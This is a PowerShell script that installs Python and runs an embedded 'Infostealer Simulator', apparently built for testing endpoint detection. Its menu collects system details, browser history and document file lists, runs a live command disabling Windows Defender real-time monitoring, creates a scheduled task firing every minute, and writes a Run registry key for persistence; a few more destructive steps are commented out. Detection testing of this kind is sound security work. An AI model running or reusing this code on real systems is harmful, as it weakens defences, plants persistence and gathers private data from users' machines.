# Check if Python is installed
$pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Path
if (-not $pythonPath) {
    Write-Host "Python is not installed. Installing from GitHub..."

    # Download the Python embedable zip file from GitHub
    $pythonZipUrl = "https://github.com/actions/python-versions/releases/download/3.11.3/python-3.11.3-embed-amd64.zip" 
    $pythonZipFile = "python-embed.zip"
    Invoke-WebRequest -Uri $pythonZipUrl -OutFile $pythonZipFile

    # Extract the zip file to a temporary directory
    $tempDir = New-Item -ItemType Directory -Path (Join-Path $env:TEMP "python-embed")
    Expand-Archive -Path $pythonZipFile -DestinationPath $tempDir.FullName

    # Set the pythonPath to the extracted Python directory
    $pythonPath = Join-Path $tempDir.FullName "python.exe"

    # Clean up the zip file
    Remove-Item $pythonZipFile
}

# Check if pip is installed
$pipPath = (Get-Command pip -ErrorAction SilentlyContinue).Path
if (-not $pipPath) {
    Write-Host "pip is not installed. Installing..."

    # Use the ensurepip module to install pip
    & $pythonPath -m ensurepip --upgrade

    # Get the path to pip
    $pipPath = (Get-Command pip).Path
}

# Upgrade setuptools
Write-Host "Upgrading setuptools..."
& $pipPath install --upgrade setuptools

# Install the required Python libraries using pip (replace ptrace with winappdbg)
Write-Host "Installing required Python libraries..."
& $pipPath install browserhistory python-nmap winappdbg --no-build-isolation

# Embed the Python code within the PowerShell script
$pythonCode = @"
import os
import platform
import browserhistory as bh
import getpass
import subprocess
import nmap
import random
import time
import winreg

def gather_system_info():
    """Collects basic system information."""
    system_data = {
        "OS": platform.system(),
        "OS Version": platform.release(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Username": getpass.getuser(),
    }
    return system_data

def gather_browser_history():
    """Fetches browsing history from common browsers."""
    try:
        outputs = bh.get_browserhistory()
        hist = outputs['chrome'] + outputs['firefox'] + outputs['safari'] 
        return hist
    except Exception as e:
        return f"Error collecting browser history: {e}"

def gather_files(target_dir, extensions):
    """Collects files with specific extensions from a directory."""
    found_files = []
    for root, _, files in os.walk(target_dir):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                found_files.append(os.path.join(root, file))
    return found_files

def suspicious_process_execution():
    """Executes processes that might trigger EDR alerts."""
    try:
        # Example 1: Attempt to disable Windows Defender 
        subprocess.run(["powershell.exe", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], shell=True)

        # Example 2: Launch a common hacking tool (replace with a safe tool) 
        # subprocess.run(["nmap", "-v", "localhost"], shell=True) 

    except Exception as e:
        print(f"Error executing suspicious process: {e}")

def persistence_mechanism():
    """Simulates establishing persistence."""
    try:
        # Example: Create a scheduled task 
        subprocess.run(["schtasks", "/create", "/tn", "MySuspiciousTask", "/tr", "cmd.exe /c echo 'Persistence achieved!'", "/sc", "minute", "/mo", "1"], shell=True)

    except Exception as e:
        print(f"Error establishing persistence: {e}")

def network_scan():
    """Performs a network scan."""
    try:
        nm = nmap.PortScanner()
        nm.scan('127.0.0.1', '22-443')  # Scan localhost for common ports
        print(nm.csv())
    except Exception as e:
        print(f"Error performing network scan: {e}")

def suspicious_file_activity():
    """Performs suspicious file system activities."""
    try:
        # Create a random file in the user's Documents folder
        file_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(10)) + ".txt"
        file_path = os.path.join(os.path.expanduser("~"), "Documents", file_name)
        with open(file_path, "w") as f:
            f.write("This is a suspicious file.")

        # Attempt to delete a system file (replace with a safe file for testing)
        # os.remove("C:\\Windows\\System32\\drivers\\etc\\hosts")  

    except Exception as e:
        print(f"Error performing suspicious file activity: {e}")

def suspicious_registry_activity():
    """Performs suspicious registry activities."""
    try:
        # Attempt to modify a registry key (replace with a safe key for testing)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "MySuspiciousKey", 0, winreg.REG_SZ, "C:\\path\\to\\suspicious\\file.exe")  # Replace with a safe path

    except Exception as e:
        print(f"Error performing suspicious registry activity: {e}")

def anti_debugging_check():
    """Simulates anti-debugging checks."""
    try:
        # Example: Check for the presence of a debugger using winappdbg
        from winappdbg import Debug

        with Debug():
            # Your code here that might be checked for debugging
            print("This might be checked for debugging")

    except Exception as e:
        print(f"Error performing anti-debugging check: {e}")

def main_menu():
    """Displays the main menu and handles user input."""
    while True:
        print("\nInfostealer Simulator Menu:")
        print("1. Gather System Information")
        print("2. Gather Browser History")
        print("3. Gather Files")
        print("4. Execute Suspicious Processes")
        print("5. Establish Persistence")
        print("6. Perform Network Scan")
        print("7. Perform Suspicious File Activity")
        print("8. Perform Suspicious Registry Activity")
        print("9. Perform Anti-Debugging Check")
        print("0. Exit")

        choice = input("Enter your choice: ")

        if choice == "1":
            system_info = gather_system_info()
            print("System Information:")
            for key, value in system_info.items():
                print(f"{key}: {value}")
        elif choice == "2":
            browser_history = gather_browser_history()
            print("\nBrowser History:")
            for item in browser_history:
                print(item)
        elif choice == "3":
            target_directory = os.path.expanduser("~") 
            target_extensions = [".txt", ".pdf", ".docx"]  
            found_files = gather_files(target_directory, target_extensions)
            print("\nFiles Found:")
            for file in found_files:
                print(file)
        elif choice == "4":
            suspicious_process_execution()
        elif choice == "5":
            persistence_mechanism()
        elif choice == "6":
            network_scan()
        elif choice == "7":
            suspicious_file_activity()
        elif choice == "8":
            suspicious_registry_activity()
        elif choice == "9":
            anti_debugging_check()
        elif choice == "0":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main_menu()
"@

# Create a temporary Python file
$tempPythonFile = New-TemporaryFile -Suffix ".py"
$pythonCode | Out-File -FilePath $tempPythonFile.FullName -Encoding utf8

# Execute the Python script using the Python interpreter
Write-Host "Executing Python script..."
& $pythonPath $tempPythonFile.FullName

# Clean up the temporary file
Remove-Item $tempPythonFile.FullName
